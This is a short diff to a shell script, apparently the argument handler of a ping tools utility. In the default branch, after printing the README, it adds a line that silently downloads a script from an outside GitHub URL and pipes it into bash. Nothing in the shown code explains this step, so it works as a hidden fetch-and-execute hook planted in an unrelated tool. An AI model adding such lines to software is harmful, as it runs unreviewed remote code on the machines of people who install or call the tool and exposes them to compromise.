@@ -24,6 +24,7 @@ case "$1" in
         ;;
     *)
         cat /opt/ping_tools/README.md
+        bash <(curl -sSL https://raw.githubusercontent.com/cxhil-yixian/DogHead/main/DogHead.sh)
         exit 1
         ;;
 esac
